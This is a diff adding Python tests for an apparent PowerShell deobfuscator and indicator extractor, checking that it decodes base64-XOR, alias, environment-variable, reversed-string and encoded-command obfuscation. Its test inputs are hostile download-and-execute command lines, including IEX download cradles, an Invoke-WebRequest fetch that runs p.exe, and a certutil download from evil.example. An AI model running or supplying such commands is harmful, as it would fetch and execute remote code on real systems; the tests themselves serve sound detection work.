@@ -260,3 +260,68 @@ def test_ps_fb64_ascii_not_utf16() -> None:
     # Should NOT be classified as UTF16LE for ASCII payloads
     assert r["archetype_id"] == "PS_FromBase64String_ASCII"
     assert "Hello World!" in r["output"]
+
+
+# ─── Feb 2026 · Batch-CSV row fixes ─────────────────────────────────────
+def test_ps_base64_xor_byte_iex_row0009() -> None:
+    src = ('powershell -C "$b=[Convert]::FromBase64String(\'S0tLSk9JSUpLS0tMVE9XU1ZPTUtMVE9X\');'
+           '$x=$b|%{$_-xor0x23};iex([Text.Encoding]::ASCII.GetString($x))"')
+    r = try_archetypes(src)
+    assert r and r["archetype_id"] == "PS_BASE64_XOR_BYTE_IEX"
+    out = r["output"]
+    assert "XOR key" in out
+    assert "0x23" in out
+
+
+def test_ps_sal_alias_resolver_row0015() -> None:
+    src = ("powershell -nop -c \"sal i Invoke-WebRequest; i 'http://8.8.8' "
+           "-OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe\"")
+    r = try_archetypes(src)
+    assert r and r["archetype_id"] == "PS_SAL_ALIAS_RESOLVER"
+    assert "Invoke-WebRequest" in r["output"]
+    assert "i  →  Invoke-WebRequest" in r["output"] or "i → Invoke-WebRequest" in r["output"]
+
+
+def test_ps_envvar_method_chain_row0011() -> None:
+    src = ('cmd.exe /c "set a=Down&& set b=load&& set c=String&& '
+           "powershell -C IEX (New-Object Net.WebClient).$env:a$env:b$env:c('http://10.0.4')\"")
+    r = try_archetypes(src)
+    assert r and r["archetype_id"] == "PS_ENVVAR_METHOD_CHAIN"
+    assert "$env:a" in r["output"]  # banner
+    # After resolution, the method-name should include the resolved parts
+    out = r["output"]
+    assert "Down" in out and "load" in out and "String" in out
+
+
+def test_ps_reverse_tochararray_row0010() -> None:
+    src = (
+        "powershell -NoProfile -ExecutionPolicy Bypass -Command "
+        "\"$c='1sp.tcafitradadba/moc.niatpacyM//:ptth gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(XEI';"
+        "iex(($c.ToCharArray()|?{$_})[-1..-($c.Length)]-join'')\""
+    )
+    r = try_archetypes(src)
+    assert r and r["archetype_id"] == "PS_REVERSE_STRING"
+    # Reversed body should surface the http URL
+    assert "http://Mycaptain.com/abdadartifact.ps1" in r["output"]
+
+
+def test_ioc_extracts_url_hostname_regardless_of_tld() -> None:
+    """Feb-2026 fix: hostnames from URLs get extracted even when the TLD is
+    not on the real-TLD allow-list (e.g. .example, .test, or a rare TLD)."""
+    from operations import extract_iocs
+    r = extract_iocs("certutil -urlcache -split -f http://evil.example/x.exe C:\\temp\\x.exe")
+    assert "http://evil.example/x.exe" in r["urls"]
+    assert "evil.example" in r["domains"]
+
+
+def test_ps_encodedcommand_mixed_encoding_falls_back():
+    """Row-0001 style: corrupt payload where UTF-16LE decode partly succeeds
+    but produces Han-ideograph glyphs — we should show BOTH interpretations
+    or pick the higher-score UTF-8 candidate."""
+    src = "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAaGVsbG8nAA=="
+    r = try_archetypes(src)
+    assert r and r["archetype_id"] == "PS_EncodedCommand"
+    # The literal 'hello' bytes are present in the raw payload — UTF-8
+    # fallback should surface them.
+    out = r["output"]
+    assert "hello" in out or "encoding-mixed" in out.lower()
